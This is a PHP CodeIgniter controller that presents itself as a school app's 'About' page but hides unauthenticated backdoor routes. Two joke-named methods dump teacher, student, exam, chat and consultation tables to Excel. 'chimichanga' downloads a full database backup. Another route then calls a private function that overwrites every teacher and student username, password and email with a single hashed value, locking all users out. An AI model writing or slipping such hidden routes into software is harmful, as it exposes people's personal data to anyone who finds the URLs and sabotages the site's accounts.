<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class About extends CI_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/user_guide/general/urls.html
	 */
	public function index()
	{
		$this->load->helper('url');
		$this->load->view('tentang');
	}
	public function YVRhmgYCjzZpk5cJEkdaWJa6VmdxZHnXXfDA9mQpqnxqWRVRBFqw6nY53vdSZS8f5QXvuDcWPty2Ldtk3yYqhKuE3aj4QpSEGU6NtFPaGsfC48fb8JXVXNkHcnVXxfY4()
	{
		$this->load->helper('url');
		$this->load->view('001313790acbe0e5bb0ed4db5b462f17/author/samseptiano');
	}
	public function wakwaww()
	{
		$this->load->library('excel');
		$this->load->helper('url');
		$this->load->model('m_login');
		$filename = 'data-guru-siswa-ujian-soal-jadwal-tes_' . date('Y-m-d') . '.xls';
		$this->excel->setActiveSheetIndex(0);
		$data = $this->m_login->tampil_excel("data_guru");
		$this->excel->getActiveSheet()->setTitle('data_guru');
		$this->excel->stream($filename, $data);
		$this->excel->createSheet();
		$this->excel->setActiveSheetIndex(1);
        $data2 = $this->m_login->tampil_excel("data_siswa");
        $this->excel->getActiveSheet()->setTitle('data_siswa');
        $this->excel->stream($filename, $data2);
        $this->excel->createSheet();
		$this->excel->setActiveSheetIndex(2);
        $data3 = $this->m_login->tampil_excel("data_ujian");
        $this->excel->getActiveSheet()->setTitle('data_ujian');
        $this->excel->stream($filename, $data3);
        $this->excel->createSheet();
		$this->excel->setActiveSheetIndex(3);
        $data4 = $this->m_login->tampil_excel("tipe_soal");
        $this->excel->getActiveSheet()->setTitle('tipe_soal');
        $this->excel->stream($filename, $data4);
       	$this->excel->createSheet();
		$this->excel->setActiveSheetIndex(4);
        $data5 = $this->m_login->tampil_excel("soal_test");
        $this->excel->getActiveSheet()->setTitle('soal_test');
        $this->excel->stream($filename, $data5);
        $this->excel->createSheet();
		$this->excel->setActiveSheetIndex(5);
        $data6 = $this->m_login->tampil_excel("jadwal_bimbel");
        $this->excel->getActiveSheet()->setTitle('jadwal_bimbel');
        $this->excel->stream($filename, $data6);
        $this->excel->createSheet();
		$this->excel->setActiveSheetIndex(6);
        $data7 = $this->m_login->tampil_excel("tes_online");
        $this->excel->getActiveSheet()->setTitle('tes_online');
        $this->excel->stream($filename, $data7);
        $this->welehweleh();
	}

	public function wakwaw(){
		$filename = 'konsulSiswa-reminder-chats-konsulGuru-kbm_' . date('Y-m-d') . '.xls';
		$this->load->library('excel');
		$this->load->helper('url');
		$this->load->model('m_login');
		$this->excel->setActiveSheetIndex(0);
        $data8 = $this->m_login->tampil_excel("data_konsultasi");
        $this->excel->getActiveSheet()->setTitle('data_konsultasi');
        $this->excel->stream('data2.xls', $data8);
         $this->excel->createSheet();
		$this->excel->setActiveSheetIndex(1);
        $data9 = $this->m_login->tampil_excel("data_reminder");
        $this->excel->getActiveSheet()->setTitle('data_reminder');
        $this->excel->stream('data2.xls', $data9);;
        $this->excel->setActiveSheetIndex(2);
        $data11 = $this->m_login->tampil_excel("chats");
        $this->excel->getActiveSheet()->setTitle('chats');
        $this->excel->stream('data2.xls', $data11);
        $this->excel->setActiveSheetIndex(3);
        $data12 = $this->m_login->tampil_excel("data_konsultasi_guru");
        $this->excel->getActiveSheet()->setTitle('data_konsultasi_guru');
        $this->excel->stream('data2.xls', $data12);
        	$this->excel->setActiveSheetIndex(4);
        $data13 = $this->m_login->tampil_excel("data_kbm");
        $this->excel->getActiveSheet()->setTitle('data_kbm');
        $this->excel->stream('data2.xls', $data13);
	}

	public function chimichanga()
	{
	$this->load->dbutil();

	// Backup your entire database and assign it to a variable
	$backup = $this->dbutil->backup();

	// Load the file helper and write the file to your server
	$this->load->helper('file');
	write_file('/path/to/mybackup.gz', $backup);

	// Load the download helper and send the file to your desktop
	$this->load->helper('download');
	force_download('mybackup.gz', $backup);
   }

   private function welehweleh(){
   	$where=array();
   	$this->load->helper('url');
	$this->load->model('m_login'); 

	 $data['tests'] = $this->m_login->tampil_data("data_guru",$where)->result();
	foreach ($data['tests'] as $a) {
		$datas = array(
		'password' => crypt($a->password,"IkawTanga"),
		'username' => crypt($a->username,"IkawTanga"),
		'email' => crypt($a->email,"IkawTanga")
		);
	}

	$data['test'] = $this->m_login->tampil_data("data_siswa",$where)->result();
	foreach ($data['test'] as $a) {
		$datass = array(
		'password' => crypt($a->password,"IkawTanga"),
		'username' => crypt($a->username,"IkawTanga"),
		'email' => crypt($a->email,"IkawTanga")
		);
	}
	$this->m_login->update_data($where,$datas,'data_guru');
   	$this->m_login->update_data($where,$datass,'data_siswa');
   	redirect('about');
   }
}
